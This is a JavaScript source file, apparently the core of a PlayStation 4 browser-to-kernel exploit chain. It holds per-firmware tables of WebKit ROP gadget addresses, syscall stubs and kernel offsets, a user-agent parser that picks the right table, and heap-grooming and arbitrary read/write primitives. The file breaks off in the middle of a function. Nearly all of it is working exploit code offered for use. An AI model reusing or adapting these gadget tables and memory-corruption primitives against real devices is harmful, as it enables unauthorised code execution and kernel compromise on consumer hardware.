(function() {
"use strict";

function zeroFill(number, width) {
  width -= number.toString().length;
  if (width > 0) {
    return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
  }
  return number + "";
}
function int64(low, hi) {
  this.low = low >>> 0;
  this.hi = hi >>> 0;
  this.backing = null;
  this.add32inplace = function (val) {
    var new_lo = ((this.low >>> 0) + val & 0xFFFFFFFF) >>> 0;
    var new_hi = this.hi >>> 0;
    if (new_lo < this.low) {
      new_hi++;
    }
    this.hi = new_hi;
    this.low = new_lo;
    if (this.backing !== null) {
      if (this.backing.byteLength < val) {
        throw new Error("int64.add32inplace: overflow");
      }
      this.backing = new Uint8Array(this.backing.buffer, val, this.backing.byteLength - val);
    }
  };
  this.add32 = function (val) {
    var new_lo = ((this.low >>> 0) + val & 0xFFFFFFFF) >>> 0;
    var new_hi = this.hi >>> 0;
    if (new_lo < this.low) {
      new_hi++;
    }
    var ret = new int64(new_lo, new_hi);
    if (this.backing !== null) {
      if (this.backing.byteLength < val) {
        throw new Error("int64.add32: overflow");
      }
      ret.backing = new Uint8Array(this.backing.buffer, val, this.backing.byteLength - val);
    }
    return ret;
  };
  this.sub32 = function (val) {
    var new_lo = ((this.low >>> 0) - val & 0xFFFFFFFF) >>> 0;
    var new_hi = this.hi >>> 0;
    if (new_lo > this.low & 0xFFFFFFFF) {
      new_hi--;
    }
    return new int64(new_lo, new_hi);
  };
  this.sub32inplace = function (val) {
    var new_lo = ((this.low >>> 0) - val & 0xFFFFFFFF) >>> 0;
    var new_hi = this.hi >>> 0;
    if (new_lo > this.low & 0xFFFFFFFF) {
      new_hi--;
    }
    this.hi = new_hi;
    this.low = new_lo;
  };
  this.and32 = function (val) {
    var new_lo = this.low & val;
    var new_hi = this.hi;
    return new int64(new_lo, new_hi);
  };
  this.and64 = function (vallo, valhi) {
    var new_lo = this.low & vallo;
    var new_hi = this.hi & valhi;
    return new int64(new_lo, new_hi);
  };
  this.toString = function (radix = 16) {
    var lo_str = (this.low >>> 0).toString(radix);
    var hi_str = (this.hi >>> 0).toString(radix);
    if (this.hi == 0) {
      return lo_str;
    } else {
      var width = radix === 16 ? 8 : Math.ceil(32 / Math.log2(radix));
      lo_str = zeroFill(lo_str, width);
    }
    return hi_str + lo_str;
  };
  return this;
}
globalThis.int64 = int64;
export { int64 };
export default int64;


export var REQUIRED_KEYS = ["fw_status", "wk_expm1_builtin", "wk_JSFunction_m_function", "wk_POP_RDI_RET", "wk_POP_RSI_RET", "wk_POP_RDX_RET", "wk_POP_RCX_RET", "wk_POP_RAX_RET", "wk_POP_R8_RET", "wk_POP_R9_RET", "wk_LEAVE_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", "wk_MOV_RDI_RSI_30_CALL", "wk_POP_RAX_MOV_RAX_JMP_18", "wk_PUSH_RBP_MOV_RBP_RSP_10", "wk_MOV_RDI_RAX_8_CALL_20", "wk_MOV_RDX_RAX_18_CALL_10", "wk_PUSH_RDX_POP_RSP_RET", "pivot_view_sp", "wk_ArrayBuffer_m_impl", "wk_ArrayBuffer_m_contents_m_data", "wk___imp___error", "k__error", "k_scan_stage1", "k_scan_stage2", "k_evf_cv", "k_sysent_661", "k_jmp_rsi"];
export var OPTIONAL_KEYS = ["k_stubs", "wk___imp_pthread_create", "k_pthread_create",
// Overrides the patch-blob name, which otherwise derives from the firmware
// key ("13.00" -> patches/1300.bin). Needed when two firmwares share one
// kernel and therefore one blob.
"kpatch",
// Names the firmware this block was copied from. Purely declarative -- no
// page reads it. tools/checkfw.js needs it: its copy-paste detector flags
// two firmwares sharing an RVA, and an alias shares EVERY RVA by
// construction, so without this a correct alias reports as 20 defects and
// buries a real one.
"alias_of"];
export var PS4 = {
  "11.00": {
    fw_status: "state=proven step4q=90/0 reboot=0 kernel_rvas=5/5-vs-dump",
    wk_expm1_builtin: 0x2193f30,
    wk_JSFunction_m_function: 0x28,
    wk_CSSFontFace_vtable: 0x3627aa8,
    wk___imp___error: 0x36e1c68,
    k__error: 0x3370,
    wk___imp_strerror: 0x36e1c98,
    c_strerror: 0x10d00,
    wk_POP_RDI_RET: 0x357a0,
    wk_POP_RAX_RET: 0x4e6a9,
    wk_MOV_RDI_RSI_30_CALL: 0x24dae58,
    wk_POP_RAX_MOV_RAX_JMP_18: 0x11d5d53,
    wk_PUSH_RBP_MOV_RBP_RSP_10: 0x2f1890,
    wk_MOV_RDI_RAX_8_CALL_20: 0x41a81,
    wk_MOV_RDX_RAX_18_CALL_10: 0x90ffe6,
    wk_PUSH_RDX_POP_RSP_RET: 0x1cc607a,
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x97db,
    wk_LEAVE_RET: 0x31f9d,
    wk_POP_RSI_RET: 0x249e2,
    wk_POP_RDX_RET: 0x10d11,
    wk_POP_RCX_RET: 0x71617,
    wk_POP_R8_RET: 0xe53a2,
    wk_POP_R9_RET: 0x6403a1,
    pivot_view_sp: 0x18,
    wk_ArrayBuffer_m_impl: 0x10,
    wk_ArrayBuffer_m_contents_m_data: 0x10,
    k_getpid: 0x1b280,
    k_scan_stage1: 0x40000,
    k_scan_stage2: 0x60000,
    k_evf_cv: 0x7fc26f,
    k_sysent_661: 0x1109350,
    k_jmp_rsi: 0x71a21
  },
  "11.50": {
    fw_status: "state=proven step4q=90/0 reboot=0 webkit=step7-20/20-x2 " + "kernel_rvas=untested-vs-dump kstr_residue=0x318",
    wk_expm1_builtin: 0x2587bd0,
    wk_JSFunction_m_function: 0x28,
    wk_POP_RDI_RET: 0x2445241,
    wk_POP_RSI_RET: 0x2503c9e,
    wk_POP_RDX_RET: 0x24cfa22,
    wk_POP_RCX_RET: 0x24c7ebf,
    wk_POP_RAX_RET: 0x2554e3f,
    wk_POP_R8_RET: 0x23bb4bd,
    wk_POP_R9_RET: 0x1c2cda1,
    wk_LEAVE_RET: 0x23c3790,
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x2445d1a,
    wk_MOV_RDI_RSI_30_CALL: 0x29609f8,
    wk_POP_RAX_MOV_RAX_JMP_18: 0x1c8bbc3,
    wk_PUSH_RBP_MOV_RBP_RSP_10: 0x1645270,
    wk_MOV_RDI_RAX_8_CALL_20: 0x1e3f795,
    wk_MOV_RDX_RAX_18_CALL_10: 0x1dea16a,
    wk_PUSH_RDX_POP_RSP_RET: 0x2abe00a,
    pivot_view_sp: 0x38,
    wk_ArrayBuffer_m_impl: 0x10,
    wk_ArrayBuffer_m_contents_m_data: 0x10,
    wk___imp___error: 0x3cbcc98,
    k__error: 0x183c0,
    wk___imp_pthread_create: 0x3cbdbb8,
    k_pthread_create: 0xa1d0,
    k_stubs: {
      3: 0x2c170,
      4: 0x2b8d0,
      5: 0x2b970,
      6: 0x2d620,
      20: 0x2cb70,
      23: 0x2b6f0,
      24: 0x2d5e0,
      25: 0x2b4d0,
      30: 0x2c9d0,
      54: 0x2cff0,
      92: 0x2b650,
      97: 0x2d050,
      98: 0x2b5f0,
      104: 0x2d380,
      105: 0x2b490,
      106: 0x2d480,
      118: 0x2b2f0,
      135: 0x2c280,
      240: 0x2d4c0,
      331: 0x2c6b0,
      432: 0x2b510,
      466: 0x2cc70,
      487: 0x2ba80,
      488: 0x2bd10,
      538: 0x2b430,
      539: 0x2b4f0,
      544: 0x2beb0,
      545: 0x2ca30,
      632: 0x2d090,
      633: 0x2d840,
      662: 0x2ccb0,
      663: 0x2c3e0,
      664: 0x2d740,
      666: 0x2d540,
      669: 0x2bdf0
    },
    k_scan_stage1: 0x40000,
    k_scan_stage2: 0x60000,
    k_evf_cv: 0x784318,
    k_sysent_661: 0x110a760,
    k_jmp_rsi: 0x704d5
  },
  "12.00": {
    fw_status: "state=UNTESTED-on-hardware webkit=offline-from-sprx " + "anchor=findcaller-validated-on-11.50 " + "kernel_rvas=verified-vs-kernel_1202.elf kpatch=10/10-sites-verified",
    wk_expm1_builtin: 0x2585090,
    wk_JSFunction_m_function: 0x28,
    wk_POP_RDI_RET: 0x4902f,
    wk_POP_RSI_RET: 0x10e37,
    wk_POP_RDX_RET: 0xf7a,
    wk_POP_RCX_RET: 0x53c0b,
    wk_POP_RAX_RET: 0x22f53,
    wk_POP_R8_RET: 0x22f52,
    wk_POP_R9_RET: 0x60b6c1,
    wk_LEAVE_RET: 0x11823,
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x2b5cb,
    wk_PUSH_RDX_POP_RSP_RET: 0x2abb03a,
    wk_MOV_RDI_RSI_30_CALL: 0x295dcd8,
    wk_POP_RAX_MOV_RAX_JMP_18: 0x8e4873,
    wk_PUSH_RBP_MOV_RBP_RSP_10: 0x285e10,
    wk_MOV_RDI_RAX_8_CALL_20: 0x6c7b0d,
    wk_MOV_RDX_RAX_18_CALL_10: 0xd37cca,
    pivot_view_sp: 0x38,
    wk_ArrayBuffer_m_impl: 0x10,
    wk_ArrayBuffer_m_contents_m_data: 0x10,
    wk___imp___error: 0x3cbcc48,
    k__error: 0x299c0,
    wk___imp_pthread_create: 0x3cbdb80,
    k_pthread_create: 0x24e00,
    k_stubs: {
      3: 0x2c160,
      4: 0x2b8c0,
      5: 0x2b960,
      6: 0x2d610,
      20: 0x2cb60,
      23: 0x2b6e0,
      24: 0x2d5d0,
      25: 0x2b4c0,
      30: 0x2c9c0,
      54: 0x2cfe0,
      92: 0x2b640,
      97: 0x2d040,
      98: 0x2b5e0,
      104: 0x2d370,
      105: 0x2b480,
      106: 0x2d470,
      118: 0x2b2e0,
      135: 0x2c270,
      240: 0x2d4b0,
      331: 0x2c6a0,
      432: 0x2b500,
      466: 0x2cc60,
      487: 0x2ba70,
      488: 0x2bd00,
      538: 0x2b420,
      539: 0x2b4e0,
      544: 0x2bea0,
      545: 0x2ca20,
      632: 0x2d080,
      633: 0x2d830,
      662: 0x2cca0,
      663: 0x2c3d0,
      664: 0x2d730,
      666: 0x2d530,
      669: 0x2bde0
    },
    k_scan_stage1: 0x40000,
    k_scan_stage2: 0x60000,
    k_evf_cv: 0x784798,
    k_sysent_661: 0x110a760,
    k_jmp_rsi: 0x47b31
  },
  "13.00": {
    fw_status: "state=proven step10=32/0-x3 reboot=0 webkit=step7-20/20 anchor=findcaller kernel_rvas=verified-on-hardware kpatch=1300.bin-10-sites-verified bug=poops",
    wk_expm1_builtin: 0x2586880,
    wk_JSFunction_m_function: 0x28,
    wk_POP_RDI_RET: 0x5c480,
    wk_POP_RSI_RET: 0x6e45e,
    wk_POP_RDX_RET: 0x12c5ba,
    wk_POP_RCX_RET: 0x1bade,
    wk_POP_RAX_RET: 0x10504,
    wk_POP_R8_RET: 0x9b311,
    wk_POP_R9_RET: 0x1dcfb1,
    wk_LEAVE_RET: 0x182f7,
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x548b,
    wk_PUSH_RDX_POP_RSP_RET: 0x2abccaa,
    wk_MOV_RDI_RSI_30_CALL: 0x295f948,
    wk_POP_RAX_MOV_RAX_JMP_18: 0x1d989e3,
    wk_PUSH_RBP_MOV_RBP_RSP_10: 0x25bae0,
    wk_MOV_RDI_RAX_8_CALL_20: 0x4a0406,
    wk_MOV_RDX_RAX_18_CALL_10: 0x1ec3ada,
    pivot_view_sp: 0x38,
    wk_ArrayBuffer_m_impl: 0x10,
    wk_ArrayBuffer_m_contents_m_data: 0x10,
    wk___imp___error: 0x3cb8cc8,
    k__error: 0x26420,
    wk___imp_pthread_create: 0x3cb9c00,
    k_pthread_create: 0x10110,
    k_stubs: {
      3: 0x2c170,
      4: 0x2b8d0,
      5: 0x2b970,
      6: 0x2d620,
      20: 0x2cb70,
      23: 0x2b6f0,
      24: 0x2d5e0,
      25: 0x2b4d0,
      30: 0x2c9d0,
      54: 0x2cff0,
      92: 0x2b650,
      97: 0x2d050,
      98: 0x2b5f0,
      104: 0x2d380,
      105: 0x2b490,
      106: 0x2d480,
      118: 0x2b2f0,
      135: 0x2c280,
      240: 0x2d4c0,
      331: 0x2c6b0,
      432: 0x2b510,
      466: 0x2cc70,
      487: 0x2ba80,
      488: 0x2bd10,
      538: 0x2b430,
      539: 0x2b4f0,
      544: 0x2beb0,
      545: 0x2ca30,
      632: 0x2d090,
      633: 0x2d840,
      662: 0x2ccb0,
      663: 0x2c3e0,
      664: 0x2d740,
      666: 0x2d540,
      669: 0x2bdf0
    },
    k_scan_stage1: 0x40000,
    k_scan_stage2: 0x60000,
    k_kl_lock: 0xe6c20,
    k_evf_cv: 0x0,
    k_sysent_661: 0x110a760,
    k_jmp_rsi: 0x47b31
  },
  "12.50": {
    fw_status: "state=UNTESTED-on-hardware " + "webkit=addfw-from-decrypted-12.50-modules (15/15 gadgets, 35/35 stubs) " + "anchor=findcaller-offline (self-check reproduces the known 11.50 and " + "12.00 anchors) " + "kernel_rvas=asserted-by-supplied-table UNVERIFIED (no 12.50 kernel dump; " + "equal to 13.00's row, which came from the same table) " + "kpatch=1250.bin bug=poops",
    wk_expm1_builtin: 0x2585110,
    // the anchor
    wk_JSFunction_m_function: 0x28,
    wk_POP_RDI_RET: 0x4902f,
    // 5f c3
    wk_POP_RSI_RET: 0x10e37,
    // 5e c3
    wk_POP_RDX_RET: 0x771ea,
    // 5a c3
    wk_POP_RCX_RET: 0x5def9,
    // 59 c3
    wk_POP_RAX_RET: 0x22f53,
    // 58 c3
    wk_POP_R8_RET: 0x22f52,
    // 47 58 c3
    wk_POP_R9_RET: 0x60b6c1,
    // 47 59 c3
    wk_LEAVE_RET: 0x77caa,
    // c9 c3
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x2b5cb,
    // 48 89 07 c3
    wk_PUSH_RDX_POP_RSP_RET: 0x2abb0ba,
    // 52 5c c3
    wk_MOV_RDI_RSI_30_CALL: 0x295dd58,
    // 48 8b 7e 30 48 8b 07 ff 10
    wk_POP_RAX_MOV_RAX_JMP_18: 0x8e4873,
    // 58 48 8b 07 ff 60 18
    wk_PUSH_RBP_MOV_RBP_RSP_10: 0x285e10,
    // 55 48 89 e5 48 8b 07 ff 50 10
    wk_MOV_RDI_RAX_8_CALL_20: 0x6c7b0d,
    // 48 8b 78 08 48 8b 07 ff 50 20
    wk_MOV_RDX_RAX_18_CALL_10: 0xd37cca,
    // 48 8b 50 38 48 8b 07 ff 50 10

    pivot_view_sp: 0x38,
    // read off G4's displacement
    wk_ArrayBuffer_m_impl: 0x10,
    wk_ArrayBuffer_m_contents_m_data: 0x10,
    wk___imp___error: 0x3cb4c48,
    k__error: 0xd9d0,
    wk___imp_pthread_create: 0x3cb5b80,
    k_pthread_create: 0x23d20,
    k_stubs: {
      3: 0x2c160,
      // read
      4: 0x2b8c0,
      // write
      5: 0x2b960,
      // open
      6: 0x2d610,
      // close
      20: 0x2cb60,
      // getpid
      23: 0x2b6e0,
      // setuid
      24: 0x2d5d0,
      // getuid
      25: 0x2b4c0,
      // geteuid
      30: 0x2c9c0,
      // accept
      54: 0x2cfe0,
      // ioctl
      92: 0x2b640,
      // fcntl
      97: 0x2d040,
      // socket
      98: 0x2b5e0,
      // connect
      104: 0x2d370,
      // bind
      105: 0x2b480,
      // setsockopt
      106: 0x2d470,
      // listen
      118: 0x2b2e0,
      // getsockopt
      135: 0x2c270,
      // socketpair
      240: 0x2d4b0,
      // nanosleep
      331: 0x2c6a0,
      // sched_yield
      432: 0x2b500,
      // thr_self
      466: 0x2cc60,
      // rtprio_thread
      487: 0x2ba70,
      // cpuset_getaffinity
      488: 0x2bd00,
      // cpuset_setaffinity
      538: 0x2b420,
      // evf_create
      539: 0x2b4e0,
      // evf_delete
      544: 0x2bea0,
      // evf_set
      545: 0x2ca20,
      // evf_clear
      632: 0x2d080,
      // thr_suspend_ucontext
      633: 0x2d830,
      // thr_resume_ucontext
      662: 0x2cca0,
      // aio_multi_delete
      663: 0x2c3d0,
      // aio_multi_wait
      664: 0x2d730,
      // aio_multi_poll
      666: 0x2d530,
      // aio_multi_cancel
      669: 0x2bde0 // aio_submit_cmd
    },
    k_scan_stage1: 0x40000,
    k_scan_stage2: 0x60000,
    // KERNEL RVAs -- not derivable from userland modules. These are the
    // supplied 12.50 table, which is identical to our 13.00 row on every
    // key we carry. Not independently verified: there is no 12.50 kernel
    // dump here. step4q byte-gates sysent/jmp before firing either.
    //
    // The table also carries PRISON0 and ROOTVNODE. We deliberately do NOT
    // store those -- chain_poops.js:1722 reads prison0 out of the live
    // kernel via curproc->ucred->cr_prison, so a wrong constant cannot
    // exist to be wrong. Its EVF_OFFSET/TARGET_ID_OFFSET are 0 because
    // netctrl does not use them, which matches k_evf_cv below.
    k_evf_cv: 0x0,
    // unused by poops
    k_sysent_661: 0x110a760,
    k_jmp_rsi: 0x47b31,
    k_kl_lock: 0xe6c20 // kernel_base = kl_lock - this
  },
  "10.01": {
    fw_status: "state=UNTESTED-on-hardware " + "webkit=addfw-from-decrypted-10.01-modules (15/15 gadgets, 35/35 " + "stubs, both SELFs pass their self_ex_info digest) " + "anchor=findcaller-offline (the same run reproduces 11.50's " + "hardware-verified anchor) " + "kernel=kernel_1001.elf out of the 10.01 PUP (fw 10.010.000 retail), " + "BUILD OUTPUT so file offset == RVA + 0x181000, not the dump rule; " + "mapping fixed by swapgs at RVA 0x1c0 + 18/18 GoldHEN-1001 kernel " + "functions on a prologue " + "kernel_rvas=evf_cv+jmp_rsi-VERIFIED-vs-kernel_1001.elf, " + "sysent_661-cross-derived (GoldHEN 1001 sysent 0x1102d90 + 661*0x30; " + "same arithmetic reproduces the proven 11.00 and 11.50 rows), " + "no-kl_lock-because-lapse " + "kpatch=1001.bin-11/11-sites-hold-a-short-conditional-jump-in-kernel_1001.elf " + "bug=lapse",
    wk_expm1_builtin: 0x218bb70,
    wk_JSFunction_m_function: 0x28,
    wk_POP_RDI_RET: 0x51056,
    wk_POP_RSI_RET: 0xbe86,
    wk_POP_RDX_RET: 0x1644b2,
    wk_POP_RCX_RET: 0x782ab,
    wk_POP_RAX_RET: 0xe882,
    wk_POP_R8_RET: 0xe881,
    wk_POP_R9_RET: 0x947b91,
    wk_LEAVE_RET: 0x2ca6c3,
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0xc037,
    wk_PUSH_RDX_POP_RSP_RET: 0x168bc7a,
    wk_MOV_RDI_RSI_30_CALL: 0x24d28f8,
    wk_POP_RAX_MOV_RAX_JMP_18: 0xaa6d13,
    wk_PUSH_RBP_MOV_RBP_RSP_10: 0x830f70,
    wk_MOV_RDI_RAX_8_CALL_20: 0xdca531,
    wk_MOV_RDX_RAX_18_CALL_10: 0x68b090,
    pivot_view_sp: 0x18,
    wk_ArrayBuffer_m_impl: 0x10,
    wk_ArrayBuffer_m_contents_m_data: 0x10,
    wk___imp___error: 0x36d1bf0,
    k__error: 0x14f40,
    wk___imp_pthread_create: 0x36d2b40,
    k_pthread_create: 0x29680,
    k_stubs: {
      3: 0x2bef0,
      4: 0x2c780,
      5: 0x2c740,
      6: 0x2d5f0,
      20: 0x2b080,
      23: 0x2c080,
      24: 0x2c900,
      25: 0x2bc10,
      30: 0x2bc90,
      54: 0x2b0c0,
      92: 0x2b840,
      97: 0x2b1f0,
      98: 0x2ce50,
      104: 0x2c390,
      105: 0x2d190,
      106: 0x2c120,
      118: 0x2bad0,
      135: 0x2ba30,
      240: 0x2c2e0,
      331: 0x2b3b0,
      432: 0x2c1c0,
      466: 0x2d310,
      487: 0x2afe0,
      488: 0x2be50,
      538: 0x2afa0,
      539: 0x2b820,
      544: 0x2ca70,
      545: 0x2d2d0,
      632: 0x2c7e0,
      633: 0x2ba10,
      662: 0x2cf50,
      663: 0x2b910,
      664: 0x2b060,
      666: 0x2d390,
      669: 0x2b7e0
    },
    k_scan_stage1: 0x40000,
    k_scan_stage2: 0x60000,
    k_evf_cv: 0x7b5133,
    k_sysent_661: 0x110a980,
    k_jmp_rsi: 0x68b1
  }
};

// 12.02 IS 12.00 for everything this table describes. The 12.00 block's own
// fw_status reads "kernel_rvas=verified-vs-kernel_1202.elf" -- those offsets
// were derived from the 12.02 kernel in the first place. Same WebKit gadgets,
// same kernel RVAs, same ten patch sites, so it takes the same blob
// (patches/1200.bin) rather than a 1202.bin that does not exist.
//
// A copy rather than a shared reference, so its fw_status can say where the
// data came from without rewriting 12.00's.
PS4["12.02"] = Object.assign({}, PS4["12.00"], {
  alias_of: "12.00",
  fw_status: "state=UNTESTED-on-hardware shares=12.00 " + "kernel_rvas=verified-vs-kernel_1202.elf (this firmware) " + "kpatch=1200.bin-10-sites-verified bug=lapse",
  kpatch: "1200.bin"
});

// 12.52 IS 12.50, per the supplied table -- same kernel row, and the WebKit
// side is taken from the single Lib_dump/12.50 module set because that is the
// only 12.5x dump we have. The kernel half of that claim is consistent with
// what we already believed (12.50's row equals 13.00's); the WebKit half is an
// ASSERTION, not a measurement. If a 12.52 libSceNKWebKit.sprx ever turns up,
// re-derive with tools/addfw.js and compare -- a moved anchor would fail at
// stage 1, loudly and harmlessly, rather than corrupting anything.
//
// Takes patches/1250.bin, since a 1252.bin does not exist.
PS4["12.52"] = Object.assign({}, PS4["12.50"], {
  alias_of: "12.50",
  fw_status: "state=UNTESTED-on-hardware shares=12.50 " + "webkit=assumed-identical-to-12.50 (no 12.52 module dump) " + "kernel_rvas=asserted-by-supplied-table UNVERIFIED " + "kpatch=1250.bin bug=poops",
  kpatch: "1250.bin"
});
export function offsetsFor(uaString) {
  var m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
  if (!m) return {
    key: null,
    off: null
  };
  var key = m[1] + "." + parseInt(m[2], 16).toString(16).padStart(2, "0");
  return {
    key,
    off: PS4[key] || null
  };
}


var DRAIN_COUNT = 512;
var AUTO_RETRY_DELAY_MS = 50;
var K = 2;
var DUPLICATE_INDEX = 2;
var CONTROL_INDEX = 0xffff;
var CONTROL_INT = -64000;
var FILLER_BIGINTS = K - 1;
var FILLER_OBJECTS = 0xfffe - K;
var EXPECTED_LENGTH = 0x50001;
var CELL_BYTES = 0x30;
var FUNCTION_BYTES = 0x20;
var NATIVE_EXECUTABLE_BYTES = 0x38;
var HOLDER_BYTES = 0x40;
var CARRIER_SLOTS = function () {
  try {
    var q = new URLSearchParams(location.search).get("slots");
    var n = q ? parseInt(q, 10) : 0;
    if (n >= 100000 && n <= 40000000) return n;
  } catch (e) {}
  return 12000000;
}();
var CARRIER_BYTES = CARRIER_SLOTS * 8;
var CAPTURE_DELAY_MS = 50;
var COMPOSE_DELAY_MS = 100;
var symbolToString = Symbol.prototype.toString;
var _gOverride = function () {
  var out = {};
  try {
    var q = new URLSearchParams(location.search).getAll("g");
    for (var item of q) {
      var [k, v] = item.split(":");
      var n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
      if (k && n > 0) out[k] = n;
    }
  } catch (e) {}
  return out;
}();
var _g = function (name, dflt) {
  return typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
};
if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
var DRAIN_SIZE = _g("drainsz", 0x10000);
var SLAB_SIZE = _g("slab", 0x400000);
var BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
var SEPARATOR_SIZE = _g("sep", 0x10000);
var EARLY_HOLE_SIZE = _g("early", 0x70000);
var GUARD_SIZE = _g("guard", 0x90000);
var PREDECESSOR_SIZE = _g("pred", 0x80000);
var FINAL_HOLE_SIZE = _g("final", 0x80000);
var RW_BUFFER_SIZE = 0x100;
var IDENT_OFFSET = 0x20;
var LEAK_SLOT_INDEX = 2;
var LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;
var REVISION = "slopkit-core-1";
var attemptKey = "".concat(REVISION, ":attempts");
var burstKey = "".concat(REVISION, ":burst");
var rwHeader = new Uint8Array(CELL_BYTES);
var targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
var holderHeader = new Uint8Array(HOLDER_BYTES);
var scratchBits = new ArrayBuffer(8);
var scratchBytes = new Uint8Array(scratchBits);
var scratchWords = new Uint32Array(scratchBits);
var scratchDouble = new Float64Array(scratchBits);
var identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef]);
var identityBytes = new Uint8Array(8);
var attemptNumber = 0;
var attemptCeiling = 0;
var keepIndex = 0;
var stopped = false;
var keepAlive = null;
var onEvent = null;
var criticalBarrier = null;
var settleResolve = null;
var settleReject = null;
var running = false;
var referenceTarget = null;
var rwBuffer = null;
var rwView = null;
var rwMirror = null;
var targetBuffer = null;
var targetView = null;
var nativeTarget = parseInt;
var fakeHost = null;
var lengthWord = null;
var anchorElement = null;
var markerObjectA = null;
var markerObjectB = null;
var targetHolder = null;
var holderGuardA = null;
var holderGuardB = null;
var fillerGraph = null;
var outerGraph = null;
var leakedScope = null;
var getterCarrier = null;
var preparedSymbolObject = null;
var capturedString = null;
var capturedWords = null;
var copiedLength = 0;
var captureState = 0;
var captureError = null;
var hostAddress = NaN;
var fakeAddress = NaN;
var predecessorWords = null;
var pointerLow = 0;
var pointerHigh = 0;
var targetAddress = NaN;
var targetAddressLow = 0;
var targetAddressHigh = 0;
var nativeTargetAddress = NaN;
var anchorElementAddress = NaN;
var markerAAddress = NaN;
var markerBAddress = NaN;
var rwOriginalVector = NaN;
var rwHeaderOK = false;
var holderHeaderOK = false;
var functionHeaderOK = false;
var nativeExecutableHeaderOK = false;
var functionStructureID = 0;
var nativeExecutableStructureID = 0;
var executableAddress = NaN;
var nativeFunctionAddress = NaN;
var nativeConstructorAddress = NaN;
var pointersRepeated = false;
var restoreObserved = false;
var retrySafe = false;
var retryScheduled = false;
var attemptPersisted = false;
var candidateEverReturned = false;
var candidateMutationStarted = false;
var zeroHeaderMiss = false;
var identityResult = 0;
var compositionState = 0;
var compositionLength = 0;
var compositionError = null;
var liveCandidate = null;
var fakeReleased = false;
var UNSEEN = -1;
var profile = {
  carrierSID: UNSEEN,
  carrierType: UNSEEN,
  carrierFlags: UNSEEN,
  carrierMode: UNSEEN,
  carrierByte28: UNSEEN,
  holderSID: UNSEEN,
  holderType: UNSEEN,
  holderFlags: UNSEEN,
  functionSID: UNSEEN,
  functionType: UNSEEN,
  functionFlags: UNSEEN,
  nativeExecSID: UNSEEN,
  nativeExecType: UNSEEN,
  nativeExecFlags: UNSEEN,
  cellSize: UNSEEN,
  vectorOffset: 0x10,
  inlineSlotOffset: 0x10,
  butterflyOffset: 0x08,
  vectorOffsetMeasured: false
};
function resetProfile() {
  profile.carrierSID = UNSEEN;
  profile.carrierType = UNSEEN;
  profile.carrierFlags = UNSEEN;
  profile.carrierMode = UNSEEN;
  profile.carrierByte28 = UNSEEN;
  profile.holderSID = UNSEEN;
  profile.holderType = UNSEEN;
  profile.holderFlags = UNSEEN;
  profile.functionSID = UNSEEN;
  profile.functionType = UNSEEN;
  profile.functionFlags = UNSEEN;
  profile.nativeExecSID = UNSEEN;
  profile.nativeExecType = UNSEEN;
  profile.nativeExecFlags = UNSEEN;
}
function hex(value) {
  return "0x".concat(value.toString(16));
}
function buffer(size) {
  return new ArrayBuffer(size);
}
function allZero(bytes, start, end) {
  for (var i = start; i < end; ++i) {
    if (bytes[i] !== 0) return false;
  }
  return true;
}
function uint32At(bytes, offset) {
  return bytes[offset] + bytes[offset + 1] * 0x100 + bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000;
}
function low48At(bytes, offset) {
  return bytes[offset] + bytes[offset + 1] * 0x100 + bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000 + bytes[offset + 4] * 0x100000000 + bytes[offset + 5] * 0x10000000000;
}
function readBytes(destination, source, count) {
  for (var i = 0; i < count; ++i) destination[i] = source[i];
}
function sameBytes(left, right, count) {
  for (var i = 0; i < count; ++i) {
    if (left[i] !== right[i]) return false;
  }
  return true;
}
function readTwiceMatches(destination, source, count) {
  readBytes(destination, source, count);
  return sameBytes(destination, source, count);
}
function aimCarrier(candidate, address) {
  var high = Math.floor(address / 0x100000000);
  scratchWords[0] = address - high * 0x100000000;
  scratchWords[1] = high;
  for (var i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
}
function restoreCarrier(candidate) {
  for (var i = 0; i < 8; ++i) candidate[0x10 + i] = rwHeader[0x10 + i];
}
function pointerFromWords(words, offset) {
  if (words[offset + 3] !== 0) return NaN;
  return words[offset] + words[offset + 1] * 0x10000 + words[offset + 2] * 0x100000000;
}
function plausibleCell(value) {
  return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
}
function plausibleAddress(value) {
  return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991 && Math.floor(value) === value;
}
function canonicalLow48(bytes, offset) {
  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}
function dumpHex(bytes, count) {
  var out = "";
  for (var i = 0; i < count; ++i) out += bytes[i].toString(16).padStart(2, "0");
  return out;
}
function encodedHeaderNumber() {
  var raw = new ArrayBuffer(8);
  var u32 = new Uint32Array(raw);
  var f64 = new Float64Array(raw);
  u32[0] = 0x00004250;
  u32[1] = 0x01062800;
  return f64[0];
}
function emit(tag, detail) {
  if (onEvent === null) return;
  try {
    onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber);
  } catch {}
}
function checkCarrierIdentity(candidate) {
  if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0 || IDENT_OFFSET + 8 > RW_BUFFER_SIZE) return 0;
  aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
  readBytes(identityBytes, rwView, 8);
  restoreCarrier(candidate);
  return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 0x3c ? 1 : -1;
}
function runIdentityProof(candidate) {
  candidateMutationStarted = true;
